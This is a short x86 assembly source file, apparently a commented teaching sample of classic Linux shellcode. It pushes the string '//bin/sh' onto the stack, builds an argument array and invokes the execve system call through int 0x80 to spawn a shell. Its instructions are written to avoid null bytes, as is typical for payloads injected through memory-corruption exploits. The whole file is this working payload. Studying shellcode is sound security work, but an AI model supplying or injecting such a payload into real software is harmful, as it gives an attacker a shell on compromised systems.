Section .text progbits alloc exec write
	global _start
_start:
	xor eax, eax			; eax = 0
	
	push eax				; push NULL
	push 0x68732f6e			
	push 0x69622f2f			; esp -> 2f 2f 62 69 6e 2f 73 68 00 00 00 00
	mov ebx, esp			; ebx = the pointer to cmd 
	push eax				; push NULL
	push ebx				
	mov ecx, esp			; ecx = the pointer to  {cmd,NULL}
	mov al, 0x0b			; eax = 0x0b
	int 0x80				; sys call